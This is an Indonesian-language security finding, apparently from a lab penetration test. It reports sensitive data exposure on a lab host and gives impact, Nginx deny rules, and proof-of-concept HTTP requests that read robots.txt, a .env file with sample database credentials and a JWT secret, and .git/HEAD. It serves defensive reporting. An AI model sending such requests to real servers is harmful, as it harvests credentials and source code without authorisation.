---

## Deskripsi

Kerentanan **Sensitive Data Exposure / Information Disclosure** terjadi ketika aplikasi web atau server mengekspos berkas rahasia, direktori tersembunyi, atau informasi konfigurasi sensitif secara terbuka tanpa adanya autentikasi dan otorisasi. Berkas seperti `.env`, `robots.txt` yang mengungkapkan direktori rahasia, repositori `.git`, serta berkas cadangan (*backup*) atau konfigurasi server dapat diakses secara publik langsung melalui browser atau alat otomatis (*directory bruteforce*).

---

## Dampak

- **Bocornya Kredensial & Kunci Rahasia**: Penyerang memperoleh akses langsung ke berkas `.env` yang berisi kredensial database (`DB_PASSWORD`), kunci rahasia aplikasi (`API_KEY`, `JWT_SECRET`), dan konfigurasi infrastruktur.
- **Ekstraksi Kode Sumber**: Akses ke direktori `.git/` memungkinkan penyerang mengunduh seluruh repositori kode sumber aplikasi (*source code leakage*) via tools seperti `git-dumper`.
- **Pengungkapan Jalur & Folder Sensitif**: Berkas `robots.txt` mengungkapkan jalur direktori tersembunyi (misal `/admin-secret/`, `/backup/`, `/dev/`) yang mempermudah tahap eksplorasi dan serangan penyerang.
- **Pengambilalihan Sistem**: Kredensial database atau SSH key yang diekstraksi dari file konfigurasi/backup dapat digunakan langsung untuk mengambil alih infrastruktur secara penuh (*Full System Compromise*).

---

## Rekomendasi Perbaikan

- **Blokir Akses Dotfiles & Backup Files**: Konfigurasikan web server (Nginx/Apache) untuk menolak seluruh permintaan ke berkas dotfiles (`.env`, `.git`, `.htaccess`) dan file cadangan (`.sql`, `.bak`, `.zip`).
- **Simpan File Konfigurasi di Luar Web Root**: Simpan berkas sensitif seperti `.env` di atas direktori `webroot` (misalnya `/var/www/` alih-alih `/var/www/html/`).
- **Bersihkan Berkas `robots.txt`**: Jangan mencantumkan direktori sensitif atau rahasia pada file `robots.txt`. Gunakan otorisasi berbasis sesi (*session-based authorization*) di server side alih-alih mengandalkan kerahasiaan direktori.

### Contoh Konfigurasi Server (Nginx)

```nginx
# Blokir akses ke seluruh dotfiles (.env, .git, dll)
location ~ /\. {
    deny all;
    return 404;
}

# Blokir akses ke berkas backup & log sensitif
location ~* \.(env|git|sql|bak|log|config)$ {
    deny all;
    return 404;
}
```

## Langkah Proof of Concept (PoC)

### Langkah 1 — Mengakses berkas `robots.txt` yang membocorkan lokasi direktori sensitif

Melakukan permintaan HTTP GET ke endpoint `/robots.txt` dan mengidentifikasi daftar lokasi folder internal/admin yang disembunyikan.

**Request:**

```http
GET /robots.txt HTTP/1.1
Host: teknobantu.lab
User-Agent: Mozilla/5.0
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /admin-secret/
Disallow: /backup/
Disallow: /.env
```

> **Capture 1:** Response berkas `robots.txt` yang mengungkapkan direktori tersembunyi

---

### Langkah 2 — Mengunduh berkas `.env` dan mengekstraksi kredensial rahasia

Berdasarkan petunjuk dari `robots.txt` atau hasil directory bruteforce, penyerang mengakses berkas `/.env` secara langsung melalui browser/curl.

**Request:**

```http
GET /.env HTTP/1.1
Host: teknobantu.lab
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/plain

DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=klaimku
DB_USERNAME=klaimku_app
DB_PASSWORD=klaimku_app_pw
JWT_SECRET=supersecretkey123
```

> **Capture 2:** Response pembacaan berkas rahasia `.env` yang berisi kredensial database dan JWT secret

---

### Langkah 3 — Memeriksa ekspos repositori `.git` dan file backup `.sql`

Mengonfirmasi keterbukaan folder `.git` (`/.git/HEAD`) dan berkas dump database (`/backup/database.sql`).

**Request:**

```http
GET /.git/HEAD HTTP/1.1
Host: teknobantu.lab
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/plain

ref: refs/heads/main
```

> **Capture 3:** Akses terbuka ke repositori `.git` dan struktur source code target
